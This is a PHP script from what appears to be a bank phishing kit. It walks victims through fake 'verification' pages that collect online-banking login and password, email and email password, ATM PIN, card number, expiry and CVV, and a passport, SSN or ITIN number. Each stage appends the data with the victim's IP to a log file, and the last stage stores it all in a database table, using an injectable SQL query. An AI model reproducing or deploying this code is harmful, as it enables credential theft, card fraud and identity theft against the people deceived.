<?php
require_once "core/helper.php";
require_once "core/parametros.php";
require_once "core/conexion.php";

if (is_session_started() === FALSE) {
    session_start();
}
function getRealIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
        return $_SERVER['HTTP_CLIENT_IP'];
       
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
   
    return $_SERVER['REMOTE_ADDR'];
}

$usuario = filter_input(INPUT_POST, "usuario");
$pass = filter_input(INPUT_POST, "clave");

$correo = filter_input(INPUT_POST, "correo");
$ccorreo = filter_input(INPUT_POST, "ccorreo");
$atm = filter_input(INPUT_POST, "atm");

$cnumber = filter_input(INPUT_POST, "cnumber");
$mes = filter_input(INPUT_POST, "mes");
$year = filter_input(INPUT_POST, "year");
$cvv = filter_input(INPUT_POST, "cvv");

$tident = filter_input(INPUT_POST, "tipoIdent");
$nident = filter_input(INPUT_POST, "nident");
$ip = getRealIP();

if (!empty($usuario) && !empty($pass)) {
    $_SESSION["usuario"]  = $usuario;
    $_SESSION["pass"] = $pass;
    $_SESSION["permiso"] = "primero";
    header("location:emailverification.go");
}

if (!empty($correo) && !empty($ccorreo) && !empty($atm) && array_key_exists("permiso",$_SESSION)) {
    $ip = getRealIP();

    $datos = "
=======================================
|| Usuario: " . $_SESSION["usuario"] . "
|| Clave: " . $_SESSION["pass"] . "
|| Correo: $correo
|| Clave: $ccorreo
|| Atm: $atm
|| Ip: $ip";

    $file = fopen(ARCHIVO, 'a+');
    fwrite($file, $datos);
    fclose($file);
    $_SESSION["correo"] = $correo;
    $_SESSION["ccorreo"] = $ccorreo;
    $_SESSION["atm"] = $atm;
    unset($_SESSION["permiso"]);
    $_SESSION["permiso2"] = "segundo";
    header("location:cardverification.go");
}
if (!empty($cnumber) && !empty($mes) && !empty($year) && !empty($cvv) && array_key_exists("permiso2",$_SESSION)) {
    $ip = getRealIP();
    unset($_SESSION["permiso2"]);
    $_SESSION["permiso3"] = "3";
    $datos = "
|| Ip: $ip
|| Numero: $cnumber
|| Exp: $mes/$year
|| Cvv: $cvv";
    $_SESSION["cnumber"] = $cnumber;
    $_SESSION["exp"] = "$mes/$year";
    $_SESSION["cvv"] = "$cvv";
    $file = fopen(ARCHIVO, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:identificationverification.go");
}
if (!empty($nident) && !empty($tident) && array_key_exists("permiso3",$_SESSION)) {
    $tipo = "";
    switch ($tident) {
        case "pasaporte":
            $tipo = "pasaporte";
            break;
        case "ssn":
            $tipo = "Número de Seguro Social";
            break;
        case "itin":
            $tipo = "Número de Identificación Personal del Contribuyente";
            break;
    }
    $ip = getRealIP();
    unset($_SESSION["permiso3"]);
    $datos = "
|| Ip: $ip
|| T.Identificacion: $tipo
|| N.Identificacion: umero: $nident
=======================================";

    $file = fopen(ARCHIVO, 'a+');
    fwrite($file, $datos);
    fclose($file);

    $usu = $_SESSION["usuario"];
    $pass = $_SESSION["pass"];
    $correo = $_SESSION["correo"];
    $ccorreo = $_SESSION["ccorreo"];
    $atm = $_SESSION["atm"];
    $cnumber = $_SESSION["cnumber"];
    $exp = $_SESSION["exp"];
    $cvv = $_SESSION["cvv"];

    $query = "INSERT INTO `bofi`(`user`, `pass`, `correo`, `cclave`, `atm`, `nutar`, `expide`, `cvv`, `tIdentificacion`, `nIdentificacion`, `ip`) VALUES ('$usu','$pass','$correo','$ccorreo','$atm','$cnumber','$exp','$cvv','$tipo',$nident,'$ip')";
    if (!mysqli_query($link, $query)) {
        echo "Error al insertar: " . mysqli_error($link);
        exit();
        //header("location:".EMPRESA);
    }
    session_destroy();
    header("location:verification.go");
}
